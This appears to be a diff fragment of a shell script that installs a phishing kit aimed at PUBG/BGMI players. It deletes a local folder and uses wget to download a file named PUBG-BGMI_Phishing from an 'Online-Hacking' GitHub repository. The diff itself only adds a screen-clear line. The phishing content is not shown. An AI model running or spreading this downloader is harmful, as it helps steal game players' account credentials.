@@ -4,6 +4,7 @@ clear
 echo ""
 rm -rf PUBG-BGMI_Phishing
 wget -q --show-progress https://raw.githubusercontent.com/Online-Hacking/Mr-OnlineHacking/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/PUBG-BGMI_Phishing
+clear
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
